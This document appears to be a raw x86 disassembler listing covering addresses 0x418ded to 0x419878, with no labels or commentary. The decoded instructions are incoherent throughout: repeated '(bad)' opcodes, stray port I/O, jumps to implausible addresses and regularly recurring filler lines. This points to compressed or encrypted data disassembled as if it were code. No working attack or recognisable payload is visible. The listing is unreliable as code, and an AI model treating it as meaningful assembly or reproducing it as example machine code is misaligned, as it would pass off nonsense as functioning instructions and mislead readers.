  418ded:	dec    esp
  418dee:	dec    eax
  418def:	mov    esi,0x817e695f
  418df4:	fs nop
  418df6:	inc    esp
  418df7:	ja     0x418d8c
  418df9:	inc    esp
  418dfa:	add    ah,BYTE PTR [ecx+ebp*2-0x9]
  418dfe:	mov    eax,0xfcd78744
  418e03:	xchg   esi,eax
  418e04:	js     0x418dd6
  418e06:	les    ebp,FWORD PTR [edi]
  418e08:	(bad)
  418e0c:	adc    dl,dl
  418e0e:	je     0x418e27
  418e10:	add    eax,0x0
	...
  418e71:	add    BYTE PTR [eax],al
  418e73:	add    BYTE PTR [esi],cl
  418e75:	bnd call 0xde7c8aab
  418e7b:	dec    dl
  418e7d:	leave  
  418e7e:	and    ah,BYTE PTR [edx-0xa]
  418e81:	xor    eax,0x7e50ffd
  418e86:	add    DWORD PTR [eax],eax
  418e88:	add    eax,0x5d000001
  418e8d:	mov    ds:0xddcd33cb,eax
  418e92:	sub    DWORD PTR [ebp-0x5536b11e],ebp
  418e98:	fldcw  WORD PTR [esi+0x2c51ca0a]
  418e9e:	ret    0x75ea
  418ea1:	frstor [edx]
  418ea3:	nop
  418ea4:	jae    0x418e41
  418ea6:	jmp    0xcef6107c
  418eab:	mov    dl,0xd3
  418ead:	inc    edx
  418eae:	stos   BYTE PTR es:[edi],al
  418eaf:	jl     0x418e56
  418eb1:	sbb    bh,BYTE PTR [esp+ebp*8+0x1a]
  418eb5:	out    0x9f,al
  418eb7:	pop    ecx
  418eb8:	mov    ebp,0x9078e452
  418ebd:	add    bh,0x80
  418ec0:	fidiv  WORD PTR ds:0x4fb53487
  418ec6:	out    dx,eax
  418ec7:	push   edi
  418ec8:	nop
  418ec9:	fimul  DWORD PTR [edi-0x6c]
  418ecc:	sti    
  418ecd:	out    0x17,eax
  418ecf:	jbe    0x418ede
  418ed1:	xor    cl,BYTE PTR [edi+edx*4-0x11]
  418ed5:	sbb    esp,0x92dccf52
  418edb:	jmp    0x418f52
  418edd:	retw   
  418edf:	sub    BYTE PTR [esi],bl
  418ee1:	mov    ebx,0xf62466a0
  418ee6:	xor    al,0xe6
  418ee8:	or     esi,0x8
  418eeb:	ret    0x89d7
  418eee:	test   al,bl
  418ef0:	test   eax,0x6b35d6aa
  418ef5:	out    0x91,eax
  418ef7:	jmp    0x156d:0x5962ceb4
  418efe:	push   ds
  418eff:	lock clc 
  418f01:	pop    ds
  418f02:	out    dx,eax
  418f03:	adc    ebx,DWORD PTR [edi]
  418f05:	push   es
  418f06:	dec    ebp
  418f07:	rcl    esi,cl
  418f09:	cmp    BYTE PTR [eax-0x5b],0x93
  418f0d:	fcmovu st,st(7)
  418f0f:	inc    esp
  418f10:	ins    BYTE PTR es:[edi],dx
  418f11:	pop    edx
  418f12:	loope  0x418ea9
  418f14:	out    dx,al
  418f15:	inc    edi
  418f16:	imul   esp,DWORD PTR [edi],0xa798866c
  418f1c:	arpl   bp,ax
  418f1e:	test   DWORD PTR [edi+0x1d],0xf48c15e4
  418f25:	xchg   edx,eax
  418f26:	pop    esi
  418f27:	jge    0x418f12
  418f29:	ds jno 0x418edd
  418f2c:	mov    ah,0x5c
  418f2e:	add    dl,cl
  418f30:	(bad)  
  418f31:	rep ins BYTE PTR es:[edi],dx
  418f33:	or     cl,BYTE PTR [esi+ebx*2-0x5c808f85]
  418f3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418f3b:	inc    ebx
  418f3c:	leave  
  418f3d:	pop    ss
  418f3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418f3f:	(bad)  
  418f41:	mov    ecx,0x6bfa849e
  418f46:	call   0xf9387c40
  418f4b:	or     BYTE PTR [edx],0x4d
  418f4e:	(bad)  
  418f4f:	jae    0x418f40
  418f51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418f52:	add    ecx,DWORD PTR [edx]
  418f54:	pusha  
  418f55:	test   al,0x9
  418f57:	in     eax,0x83
  418f59:	ror    dh,1
  418f5b:	(bad)  
  418f5c:	fisttp WORD PTR [eax-0x42]
  418f5f:	xor    eax,0xeddb34ec
  418f64:	push   0x30
  418f66:	pop    es
  418f67:	out    dx,al
  418f68:	pop    DWORD PTR [esi+0x151978d4]
  418f6e:	pop    ebp
  418f6f:	or     eax,0xf9835dee
  418f74:	daa    
  418f75:	cdq    
  418f76:	pop    edi
  418f77:	mov    eax,ds:0x4f42c782
  418f7c:	mov    bl,0x93
  418f7e:	enter  0x2496,0xf
  418f82:	or     DWORD PTR [esi-0x8],ebp
  418f85:	scas   al,BYTE PTR es:[edi]
  418f86:	rcl    esi,0x34
  418f89:	sti    
  418f8a:	dec    edi
  418f8b:	clc    
  418f8c:	iret   
  418f8d:	shr    DWORD PTR [edx+0x32ea],cl
	...
  418ff3:	add    BYTE PTR [edi+edx*4],bl
  418ff6:	in     al,0x47
  418ff8:	out    dx,eax
  418ff9:	ja     0x418fba
  418ffb:	fild   WORD PTR [ecx-0x31150e59]
  419001:	data16 fidivr DWORD PTR [edx-0x16]
  419005:	or     BYTE PTR [ecx],al
  419007:	add    BYTE PTR ds:0x2f000001,al
  41900d:	push   ebp
  41900e:	scas   al,BYTE PTR es:[edi]
  41900f:	pop    esi
  419011:	div    BYTE PTR [edi+eiz*1-0x1ea46f9f]
  419018:	ret    0xe2dd
  41901b:	popf   
  41901c:	or     eax,0x9f7eb284
  419021:	inc    edx
  419022:	sub    DWORD PTR [esp+eax*2-0x3f],eax
  419026:	sti    
  419027:	pop    es
  419028:	mov    ebp,0xd4a15ee0
  41902d:	push   0xae56811f
  419032:	fs jnp 0x419042
  419035:	mov    ah,0x8
  419037:	xchg   ebp,eax
  419038:	pop    eax
  419039:	nop
  41903a:	xor    ch,BYTE PTR [ebx+0x7f]
  41903d:	mov    ch,0x51
  41903f:	push   ebp
  419040:	sahf   
  419041:	xchg   edx,eax
  419042:	sbb    BYTE PTR [eax-0x3d2121cc],cl
  419048:	sbb    DWORD PTR [eax+0x2c],ecx
  41904b:	push   es
  41904c:	pusha  
  41904d:	adc    eax,0x6ec3b94f
  419052:	fmul   st(0),st
  419054:	xor    DWORD PTR [eax-0x2d],0xffffff83
  419058:	inc    edi
  419059:	pop    eax
  41905a:	retf   0xc203
  41905d:	add    dl,BYTE PTR [edi+0x58be1fd2]
  419063:	dec    ebp
  419064:	adc    DWORD PTR [edx],esi
  419066:	rcr    BYTE PTR [esi],0xa0
  419069:	jbe    0x419028
  41906b:	mov    ebp,0x46d7bd76
  419070:	sub    eax,0x1b81c4fc
  419075:	sub    eax,0xfd3b90cb
  41907a:	pop    esp
  41907b:	cwde   
  41907c:	pushf  
  41907d:	push   0xa
  41907f:	inc    edi
  419080:	push   esi
  419081:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419082:	sub    eax,0xf850f789
  419087:	add    al,0x15
  419089:	sbb    al,0x10
  41908b:	imul   DWORD PTR [ecx+0x5c24a475]
  419091:	repz jge 0x419052
  419094:	callw  0x6d89
  419098:	rol    ah,0xa9
  41909b:	stos   BYTE PTR es:[di],al
  41909d:	add    DWORD PTR [ecx+0x3d1ca996],eax
  4190a3:	or     al,0x3a
  4190a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4190a6:	xor    al,0x99
  4190a8:	(bad)  
  4190a9:	aam    0x37
  4190ab:	xchg   ecx,eax
  4190ac:	enter  0xd704,0x6c
  4190b0:	push   ecx
  4190b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4190b2:	mov    esi,0x8bbff58b
  4190b7:	nop
  4190b8:	and    cl,ch
  4190ba:	sub    dh,dh
  4190bc:	loopne 0x419095
  4190be:	nop
  4190bf:	and    eax,0x71b52d83
  4190c4:	pop    eax
  4190c5:	jmp    0x68ea8d6
  4190ca:	int3   
  4190cb:	test   esi,ecx
  4190cd:	out    0xf,eax
  4190cf:	cmp    esp,DWORD PTR [ebp-0x3e]
  4190d2:	mov    ah,dh
  4190d4:	mov    ecx,0x3b4f072b
  4190d9:	ret    0x579a
  4190dc:	mov    ebp,0x9d0d0ec3
  4190e1:	mov    bl,0x5d
  4190e3:	out    dx,eax
  4190e4:	xor    DWORD PTR [ebx+ebp*8+0x6cf32e28],0xadbb6d05
  4190ef:	sub    BYTE PTR [eax-0x6e1e1aad],bl
  4190f5:	scas   al,BYTE PTR es:[edi]
  4190f6:	jge    0x4190cc
  4190f8:	test   eax,0x2328f641
  4190fd:	les    ecx,FWORD PTR [ebx-0x497ebc26]
  419103:	outs   dx,DWORD PTR es:[esi]
  419105:	in     eax,0x4c
  419107:	ins    BYTE PTR es:[edi],dx
  419108:	inc    edi
  419109:	add    BYTE PTR [eax],ch
  41910b:	test   eax,0x6181cafd
  419110:	jbe    0x419112
	...
  419172:	add    BYTE PTR [eax],al
  419174:	scas   eax,DWORD PTR es:[edi]
  419175:	test   DWORD PTR [esi-0xa441be],ebx
  41917b:	in     eax,dx
  41917c:	inc    esi
  41917d:	push   0x4d
  41917f:	or     al,BYTE PTR [ebp-0x13]
  419182:	xor    eax,0x109ef53
  419187:	add    BYTE PTR ds:0x36000001,al
  41918d:	popf   
  41918e:	aad    0xf1
  419190:	sbb    eax,0x9c6ab0e6
  419195:	push   edx
  419196:	imul   esp,DWORD PTR [eax+0x1437785c],0xffffff8c
  41919d:	repnz (bad) 
  41919f:	cli    
  4191a0:	sub    ecx,DWORD PTR [esi-0x64d1422]
  4191a6:	das    
  4191a7:	out    0x69,eax
  4191a9:	retf   
  4191aa:	scas   al,BYTE PTR es:[edi]
  4191ab:	psubb  mm6,QWORD PTR [edx-0x7]
  4191af:	outs   dx,DWORD PTR ds:[esi]
  4191b0:	push   es
  4191b1:	cmp    ah,BYTE PTR [edx]
  4191b3:	jecxz  0x419230
  4191b5:	jmp    FWORD PTR [edi-0x69]
  4191b8:	scas   al,BYTE PTR es:[edi]
  4191b9:	std    
  4191ba:	mov    bl,0xe3
  4191bc:	and    al,0x2
  4191be:	mov    bh,0x9f
  4191c0:	call   0x11839829
  4191c5:	cli    
  4191c6:	jb     0x41915b
  4191c8:	sbb    BYTE PTR [eax+0x2b2a01c3],0x9f
  4191cf:	aas    
  4191d0:	scas   al,BYTE PTR es:[edi]
  4191d1:	lods   eax,DWORD PTR ds:[esi]
  4191d2:	iret   
  4191d3:	mov    cl,0x4e
  4191d5:	jmp    0x4191e2
  4191d7:	in     al,dx
  4191d8:	rcr    DWORD PTR [eax+edx*2-0x20],0xf
  4191dd:	mov    edx,ebx
  4191df:	pop    es
  4191e0:	jne    0x4191ad
  4191e2:	mov    ch,al
  4191e4:	sub    esp,DWORD PTR [edx]
  4191e6:	push   edi
  4191e7:	fbld   TBYTE PTR [ecx+0x54]
  4191ea:	mov    al,0xdb
  4191ec:	add    BYTE PTR [edx],al
  4191ee:	shl    DWORD PTR [ecx-0x1f4938b4],0xd4
  4191f5:	dec    edx
  4191f6:	adc    cl,BYTE PTR ds:0x313d6ec1
  4191fc:	xchg   ebx,eax
  4191fd:	mov    bh,BYTE PTR [ebx]
  4191ff:	cmp    al,0x7e
  419201:	xchg   edx,eax
  419202:	lock (bad) 
  419204:	dec    ecx
  419205:	das    
  419206:	pop    ss
  419207:	dec    edi
  419208:	jbe    0x419195
  41920a:	retf   0xce19
  41920d:	xor    al,0xd2
  41920f:	and    BYTE PTR [edx],0xc0
  419212:	xchg   BYTE PTR [ebp+0x0],cl
  419215:	xchg   BYTE PTR [ecx+ebp*4],bh
  419218:	push   edx
  419219:	cdq    
  41921a:	inc    edi
  41921b:	mov    ecx,0x5057315c
  419220:	ficomp DWORD PTR [ebx]
  419222:	icebp  
  419223:	mov    BYTE PTR [eax-0x5b60f4ec],bl
  419229:	push   ebx
  41922a:	mov    DWORD PTR [ebx+0x1b],0x322e728d
  419231:	and    al,0x48
  419233:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419234:	shr    BYTE PTR [ebp-0x7198297],0x9
  41923b:	nop
  41923c:	rol    DWORD PTR [ebp+0x36ec8712],1
  419242:	adc    edx,edx
  419244:	jae    0x41928e
  419246:	push   esi
  419247:	pop    edx
  419248:	repz loop 0x4192a7
  41924b:	in     eax,0x39
  41924d:	xchg   ebx,eax
  41924e:	test   DWORD PTR [eax-0x26],edi
  419251:	(bad)  
  419252:	shl    BYTE PTR [ebp+0x2425b18f],cl
  419258:	mov    BYTE PTR ds:0x3d8dc012,bh
  41925e:	mov    DWORD PTR [ebp+0x86d9f04],edx
  419264:	test   eax,0x65d5366e
  419269:	mov    al,0x7b
  41926b:	scas   al,BYTE PTR es:[edi]
  41926c:	scas   al,BYTE PTR es:[edi]
  41926d:	test   ch,0x4a
  419270:	pop    ebx
  419271:	es daa 
  419273:	jmp    0x41926f
  419275:	jecxz  0x41927f
  419277:	mov    eax,DWORD PTR [esi-0x69745e12]
  41927d:	push   0xffffff8b
  41927f:	mov    eax,ds:0x7ccc767b
  419284:	push   edx
  419285:	mov    gs,WORD PTR [edi-0x589b7d40]
  41928b:	rcl    DWORD PTR [eax],cl
  41928d:	sub    eax,0x7c817a
	...
  4192f2:	add    BYTE PTR [eax],al
  4192f4:	mov    al,ds:0xff33bae7
  4192f9:	jg     0x4192a4
  4192fb:	neg    eax
  4192fd:	pop    ss
  4192fe:	daa    
  4192ff:	inc    edi
  419300:	fcom   DWORD PTR [eax]
  419302:	pop    ebp
  419303:	xlat   BYTE PTR ds:[ebx]
  419304:	hlt    
  419305:	or     al,BYTE PTR [ecx]
  419307:	add    BYTE PTR ds:0xcd000001,al
  41930d:	mov    WORD PTR [eax+0x6e860dcc],es
  419313:	dec    eax
  419314:	xchg   esi,eax
  419315:	pushf  
  419316:	mov    edx,DWORD PTR [edi]
  419318:	rcl    DWORD PTR [edi-0x5b25490f],0x4b
  41931f:	mov    al,ds:0x94d7aa3b
  419324:	cmp    DWORD PTR [esi-0x272d1b5f],edx
  41932a:	fistp  WORD PTR [eax+eax*8-0x4752bf8f]
  419331:	imul   edi,esp,0x5e
  419334:	ret    0xc93d
  419337:	push   edi
  419338:	shl    BYTE PTR [ecx-0x78],0x4a
  41933c:	sub    ch,BYTE PTR [eax+edi*2]
  41933f:	mov    BYTE PTR [edi-0x4d13d277],ch
  419345:	int    0x87
  419347:	sbb    edi,DWORD PTR [ebx-0x50]
  41934a:	sub    ah,bh
  41934c:	pop    esi
  41934d:	popa   
  41934e:	out    0xaa,al
  419350:	adc    DWORD PTR [edi],ecx
  419352:	or     dl,BYTE PTR [edx-0x51754719]
  419358:	inc    eax
  419359:	dec    ecx
  41935a:	aas    
  41935b:	pop    ds
  41935c:	shl    DWORD PTR [ecx+eiz*2],0xd9
  419360:	and    al,0x2d
  419362:	sti    
  419363:	dec    esi
  419364:	xchg   edx,eax
  419365:	jp     0x41938c
  419367:	addr16 cli 
  419369:	adc    WORD PTR [eax],0x69
  41936d:	loope  0x419333
  41936f:	xor    al,0xb9
  419371:	clc    
  419372:	dec    ebp
  419373:	cvtps2pd xmm3,xmm0
  419376:	and    BYTE PTR ds:0x1ddb33d5,bl
  41937c:	jmp    0x30eb487
  419381:	popa   
  419382:	xlat   BYTE PTR ds:[ebx]
  419383:	sbb    ebx,DWORD PTR [edi+0x23]
  419386:	dec    edx
  419387:	cmc    
  419388:	jno    0x419356
  41938a:	loope  0x4193e4
  41938c:	pusha  
  41938d:	add    edx,esi
  41938f:	not    BYTE PTR [ebx]
  419391:	inc    ecx
  419392:	cdq    
  419393:	jecxz  0x41937c
  419395:	in     al,0x7d
  419397:	gs mov edi,0xb7fe254c
  41939d:	(bad)  
  41939e:	xor    ah,BYTE PTR [ebp+0x73a8e35b]
  4193a4:	fwait
  4193a5:	and    al,0xf8
  4193a7:	mov    bh,0x58
  4193a9:	push   esi
  4193aa:	lods   eax,DWORD PTR ds:[esi]
  4193ab:	sub    ah,dl
  4193ad:	push   ebp
  4193ae:	retf   
  4193af:	inc    ecx
  4193b0:	push   ecx
  4193b1:	sub    eax,0xb71b70b7
  4193b6:	xchg   ebx,eax
  4193b7:	push   eax
  4193b8:	xchg   edx,eax
  4193b9:	ror    BYTE PTR [ebx-0x38],cl
  4193bc:	inc    ebx
  4193bd:	mov    ecx,0xfc8178c5
  4193c2:	push   ecx
  4193c3:	sar    DWORD PTR [edx+0x118876be],1
  4193c9:	(bad)  
  4193ca:	clc    
  4193cb:	loop   0x4193e6
  4193cd:	xor    ebx,DWORD PTR [eax-0x67061bb]
  4193d3:	arpl   WORD PTR [edi+0x30c4b384],sp
  4193d9:	mov    cl,0xd8
  4193db:	sub    BYTE PTR [esi-0x4f],ah
  4193de:	cmp    eax,0x73259480
  4193e3:	mov    ebp,0xe6e04deb
  4193e8:	popa   
  4193e9:	ja     0x419410
  4193eb:	xchg   edx,eax
  4193ec:	xchg   esp,eax
  4193ed:	sbb    BYTE PTR [edx+0x74],ch
  4193f0:	adc    dh,BYTE PTR [esi-0x18]
  4193f3:	adc    bl,BYTE PTR [edx]
  4193f5:	data16 add dh,BYTE PTR [eax]
  4193f8:	push   ds
  4193f9:	xor    BYTE PTR [edx-0x507e93f9],dl
  4193ff:	mov    ebx,0x734a96a5
  419404:	jbe    0x4193bf
  419406:	jbe    0x4193b7
  419408:	(bad)  
  419409:	loopne 0x419436
  41940b:	fmul   QWORD PTR [edi]
  41940d:	sahf   
  41940e:	mov    al,0x2f
  419410:	iret   
	...
  419471:	add    BYTE PTR [eax],al
  419473:	add    BYTE PTR ds:0xed3a6998,bh
  419479:	sti    
  41947a:	jg     0x41941b
  41947c:	cmp    ebx,esi
  41947e:	je     0x419446
  419480:	mov    BYTE PTR [ecx+esi*4+0x10bf9dc],ch
  419487:	add    BYTE PTR ds:0x68000001,al
  41948d:	jno    0x4194d9
  41948f:	and    ecx,ebp
  419491:	mov    ds:0xf2fb8f62,eax
  419496:	cmp    ebx,DWORD PTR [eax+ecx*8]
  419499:	inc    ebx
  41949a:	ins    BYTE PTR es:[edi],dx
  41949b:	test   BYTE PTR [edx-0x1cb4fe55],ah
  4194a1:	add    al,0x9d
  4194a3:	mov    edx,0xf5d20c4e
  4194a8:	ds push 0xa8e19ec
  4194ae:	push   ss
  4194af:	paddd  mm2,QWORD PTR [ebx-0x9]
  4194b3:	inc    esp
  4194b4:	xchg   edx,eax
  4194b5:	pop    eax
  4194b6:	out    0x4e,al
  4194b8:	je     0x41944f
  4194ba:	js     0x41952f
  4194bc:	xchg   ecx,eax
  4194bd:	push   ss
  4194be:	repz popf 
  4194c0:	in     al,0xbb
  4194c2:	fld    TBYTE PTR [eax+ecx*4]
  4194c5:	lahf   
  4194c6:	fwait
  4194c7:	std    
  4194c8:	loope  0x419525
  4194ca:	xor    BYTE PTR [ebp+0x2],dh
  4194cd:	push   edi
  4194ce:	dec    ecx
  4194cf:	cmp    BYTE PTR [ecx],dl
  4194d1:	mov    ds:0xe56a26be,eax
  4194d6:	cdq    
  4194d7:	fs daa 
  4194d9:	adc    dh,BYTE PTR [ebx]
  4194db:	or     DWORD PTR ds:0xcde15055,eax
  4194e1:	cmp    eax,0x83f790a9
  4194e6:	icebp  
  4194e7:	clc    
  4194e8:	xor    ah,BYTE PTR [edx+edi*4+0x25]
  4194ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4194ed:	mov    WORD PTR [ebx-0x1a2cec44],fs
  4194f3:	rcl    ecx,cl
  4194f5:	push   ebp
  4194f6:	loop   0x41949f
  4194f8:	sbb    eax,0xff21fd78
  4194fd:	and    edx,DWORD PTR [edx+0x2f752d9e]
  419503:	adc    ebx,DWORD PTR [ebx+0x7d]
  419506:	and    BYTE PTR [ebp+0x3a6e2d77],0xc9
  41950d:	jg     0x419510
  41950f:	out    0x8d,al
  419511:	mov    ah,BYTE PTR [edi+0x56910539]
  419517:	mul    DWORD PTR [edi-0x7f8bff20]
  41951d:	ret    0x335b
  419520:	cli    
  419521:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419522:	push   0xa6ead73
  419527:	ins    BYTE PTR es:[edi],dx
  419528:	mov    edi,0xcb2e78a4
  41952d:	int3   
  41952e:	sbb    eax,0x57cdd4d9
  419533:	test   BYTE PTR [edi],al
  419535:	pop    ss
  419536:	adc    DWORD PTR [ebp-0x41],edx
  419539:	pop    edx
  41953a:	stos   DWORD PTR es:[edi],eax
  41953b:	sub    eax,DWORD PTR [esi-0x1]
  41953e:	sbb    edi,edx
  419540:	push   edi
  419541:	cmp    DWORD PTR [esi],ebx
  419543:	fwait
  419544:	inc    ebx
  419545:	sahf   
  419546:	cld    
  419547:	cs dec eax
  419549:	inc    eax
  41954a:	or     DWORD PTR [edx-0x72910e69],0x7838ca35
  419554:	gs test al,0x18
  419557:	jno    0x4194e2
  419559:	jl     0x4194de
  41955b:	das    
  41955c:	mov    edx,0x678de4cc
  419561:	dec    ebp
  419562:	xor    al,0xe9
  419564:	push   ds
  419565:	pop    eax
  419566:	int3   
  419567:	stc    
  419568:	cwde   
  419569:	cmp    BYTE PTR [esi-0x3171badb],0xdd
  419570:	daa    
  419571:	ficomp DWORD PTR [esi+0x19b5cd2f]
  419577:	cmp    BYTE PTR [eax],0x31
  41957a:	iret   
  41957b:	add    BYTE PTR [ecx+0x745607ef],0x8a
  419582:	dec    eax
  419583:	pop    edx
  419584:	add    dh,0x44
  419587:	(bad)  
  419588:	iret   
  419589:	push   0xb2e0b19d
  41958e:	adc    bh,0xac
	...
  4195f1:	add    BYTE PTR [eax],al
  4195f3:	add    BYTE PTR [edi-0x9d722c],ch
  4195f9:	jnp    0x4195ea
  4195fb:	fstp   st(1)
  4195fd:	fcomp  QWORD PTR [ebx+0x2f]
  419600:	arpl   WORD PTR [ecx+0x24],ax
  419603:	js     0x419603
  419605:	or     al,0x1
  419607:	add    BYTE PTR ds:0xbf000001,al
  41960d:	std    
  41960e:	in     al,0xd5
  419610:	outs   dx,BYTE PTR ds:[esi]
  419611:	mov    esp,?
  419613:	int3   
  419614:	pop    esp
  419615:	mov    ds:0x79e74838,eax
  41961a:	shl    DWORD PTR [edi],1
  41961c:	and    edx,esi
  41961e:	es push ebp
  419620:	dec    eax
  419621:	push   eax
  419622:	jo     0x4195f7
  419624:	aaa    
  419625:	xchg   ebp,eax
  419626:	pop    esp
  419627:	push   edx
  419628:	sub    BYTE PTR [ebx-0x7a],0x18
  41962c:	sbb    DWORD PTR [ebx],edi
  41962e:	sub    al,0x91
  419630:	bound  esp,QWORD PTR ds:[edx-0x3e]
  419634:	mov    eax,ds:0x41ad71df
  419639:	in     al,0x85
  41963b:	xor    al,0x6d
  41963d:	arpl   WORD PTR es:0x20518134,si
  419644:	and    BYTE PTR [edi+ebx*1+0x6ca9042b],cl
  41964b:	loop   0x419649
  41964d:	push   eax
  41964e:	or     DWORD PTR [ebx],esi
  419650:	jmp    0x1560:0xee514652
  419657:	or     BYTE PTR [edx+0x7f2f824c],cl
  41965d:	fadd   QWORD PTR [edi+0x28]
  419660:	inc    edx
  419661:	js     0x4196de
  419663:	push   cs
  419664:	imul   esp,DWORD PTR [ebx+edi*8+0x14],0x5df6b10c
  41966c:	ins    DWORD PTR es:[edi],dx
  41966d:	iret   
  41966e:	repnz retf 
  419670:	retf   
  419671:	xor    al,0xbe
  419673:	test   eax,0x73f09bb8
  419678:	pop    ecx
  419679:	loope  0x4196c4
  41967b:	cmp    eax,ecx
  41967d:	or     BYTE PTR [ebp+0x76ef24e4],cl
  419683:	fldenv [esi-0x33cf6045]
  419689:	pushf  
  41968a:	scas   al,BYTE PTR es:[edi]
  41968b:	push   ebp
  41968c:	test   BYTE PTR [ebp+0x12],dl
  41968f:	imul   edx,DWORD PTR [eax+0x5a],0x89986e28
  419696:	mov    cl,0x14
  419698:	retf   0xa710
  41969b:	add    al,0xaf
  41969d:	and    esp,esi
  41969f:	out    dx,al
  4196a0:	mov    dl,0xf0
  4196a2:	mov    eax,ds:0x7d924bce
  4196a7:	add    ebx,ecx
  4196a9:	nop
  4196aa:	lahf   
  4196ab:	xor    eax,0x7eb95943
  4196b0:	and    BYTE PTR [esi+0x29],cl
  4196b3:	cmp    cl,dl
  4196b5:	sbb    eax,edx
  4196b7:	dec    edi
  4196b8:	test   DWORD PTR [ebp-0x48],0x98432899
  4196bf:	jbe    0x4196d3
  4196c1:	into   
  4196c2:	xor    BYTE PTR [eax-0x1],ah
  4196c5:	mov    esp,0x9913cb55
  4196ca:	rcl    dl,1
  4196cc:	retf   
  4196cd:	into   
  4196ce:	xor    eax,DWORD PTR [edx-0x3a]
  4196d1:	inc    ecx
  4196d2:	out    dx,al
  4196d3:	jb     0x4196b9
  4196d5:	pop    ss
  4196d6:	(bad)  
  4196d7:	or     BYTE PTR ds:[edi+0x1cab3abd],ah
  4196de:	sbb    al,bl
  4196e0:	mov    al,0x93
  4196e2:	cs scas al,BYTE PTR es:[edi]
  4196e4:	rcl    BYTE PTR [ebp+0x42],1
  4196e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4196e8:	push   esp
  4196e9:	adc    BYTE PTR [ecx],ch
  4196eb:	mov    fs,WORD PTR [ebx]
  4196ed:	mov    ecx,0xd8d48861
  4196f2:	jmp    0x419766
  4196f4:	xchg   DWORD PTR [edi],eax
  4196f6:	dec    esi
  4196f7:	mov    bh,BYTE PTR [esi-0x65ea694c]
  4196fd:	fstp   QWORD PTR [edx+0x2d9deafe]
  419703:	std    
  419704:	fisttp QWORD PTR [edx+ebx*1]
  419707:	test   al,0xf6
  419709:	inc    ebp
  41970a:	ficomp WORD PTR [ecx-0x3d]
  41970d:	mov    ecx,0xa8fd1c
	...
  419772:	add    BYTE PTR [eax],al
  419774:	mov    bl,0x3f
  419776:	jno    0x4197dd
  419778:	std    
  419779:	outs   dx,DWORD PTR ds:[esi]
  41977a:	mov    bh,0xff
  41977c:	add    eax,0x3c8dd0ae
  419781:	or     BYTE PTR [ecx],ch
  419783:	imul   eax,DWORD PTR [ebx],0xe
  419786:	add    DWORD PTR [eax],eax
  419788:	add    eax,0x23000001
  41978d:	cwde   
  41978e:	cmp    al,BYTE PTR [esi+0x6a400029]
  419794:	stos   BYTE PTR es:[edi],al
  419795:	adc    esi,ebx
  419797:	jle    0x419773
  419799:	fdivr  QWORD PTR [eax]
  41979b:	mov    edx,0x377b0c78
  4197a0:	cmp    bh,bh
  4197a2:	pop    edi
  4197a3:	adc    eax,0xaed2e6b3
  4197a8:	mov    eax,DWORD PTR [edi]
  4197aa:	stos   DWORD PTR es:[edi],eax
  4197ab:	sar    eax,0xb
  4197ae:	pop    ecx
  4197af:	bound  edx,QWORD PTR [ecx-0xb06ff8e]
  4197b5:	cmp    ah,BYTE PTR [edi]
  4197b7:	jmp    0x4d30ae8a
  4197bc:	loop   0x41980d
  4197be:	adc    BYTE PTR [edi+0x6b],ah
  4197c1:	in     al,0xaf
  4197c3:	pop    ebp
  4197c4:	dec    esi
  4197c5:	sbb    esi,DWORD PTR [esi+esi*1]
  4197c8:	push   esp
  4197c9:	xor    BYTE PTR [ecx],bh
  4197cb:	or     DWORD PTR [esi+0x1c],esi
  4197ce:	cmp    eax,0x337ddd5a
  4197d3:	xor    ebp,DWORD PTR [ebx]
  4197d5:	mov    eax,ds:0x6fe91a70
  4197da:	lock inc esi
  4197dc:	push   eax
  4197dd:	fcmovne st,st(1)
  4197df:	or     al,0xbd
  4197e1:	pop    ebp
  4197e2:	sub    DWORD PTR [ecx-0x68],edx
  4197e5:	xlat   BYTE PTR ds:[ebx]
  4197e6:	push   cs
  4197e7:	dec    ecx
  4197e8:	test   eax,0xe201187
  4197ed:	ds into 
  4197ef:	fcmovu st,st(2)
  4197f1:	sub    dh,BYTE PTR [eax-0x31]
  4197f4:	jae    0x419859
  4197f6:	out    dx,eax
  4197f7:	imul   edx,DWORD PTR ds:0xaceaae32,0x613f6fc1
  419801:	adc    BYTE PTR [ecx+0x6f],dl
  419804:	inc    edx
  419805:	inc    ebp
  419806:	js     0x419887
  419808:	stos   DWORD PTR es:[edi],eax
  419809:	shl    ebp,cl
  41980b:	pop    eax
  41980c:	dec    esp
  41980d:	leave  
  41980e:	xor    DWORD PTR [esi+0x5d],ebx
  419811:	adc    ecx,ecx
  419813:	shl    BYTE PTR [ebx],1
  419815:	retf   0x9483
  419818:	outs   dx,BYTE PTR ds:[esi]
  419819:	frstor [ebx]
  41981b:	sub    eax,0xef2bb2e5
  419820:	xchg   esp,eax
  419821:	jbe    0x41982e
  419823:	cmp    dh,BYTE PTR [ebp+0x665f2d5b]
  419829:	ror    DWORD PTR [eax],0xb6
  41982c:	rcl    DWORD PTR ds:[ebp+0x18],1
  419830:	iret   
  419831:	enter  0x4d55,0xb6
  419835:	mov    al,0xa7
  419837:	imul   eax,ebp,0x79
  41983a:	push   cs
  41983b:	(bad)  
  41983c:	das    
  41983d:	in     eax,dx
  41983e:	push   es
  41983f:	xor    eax,0x54e1f0f0
  419844:	leave  
  419845:	das    
  419846:	fstp   TBYTE PTR [ecx-0x65]
  419849:	jecxz  0x41985c
  41984b:	sub    dl,BYTE PTR [esi+eax*1]
  41984e:	test   DWORD PTR [ecx+ecx*4],ecx
  419851:	dec    esp
  419852:	pusha  
  419853:	push   0x51
  419855:	add    BYTE PTR ds:0xfa38be6f,bl
  41985b:	es dec ebx
  41985d:	jbe    0x4198b2
  41985f:	stos   DWORD PTR es:[edi],eax
  419860:	adc    esp,esi
  419862:	inc    BYTE PTR [edi-0x3dfabb4c]
  419868:	jl     0x419897
  41986a:	stos   BYTE PTR es:[edi],al
  41986b:	idiv   BYTE PTR [esp+esi*1]
  41986e:	out    dx,al
  41986f:	test   BYTE PTR [eax+0xfef945b],ch
  419875:	mov    bh,0x3f
  419877:	dec    edx
  419878:	xlat   BYTE PTR ds:[ebx]
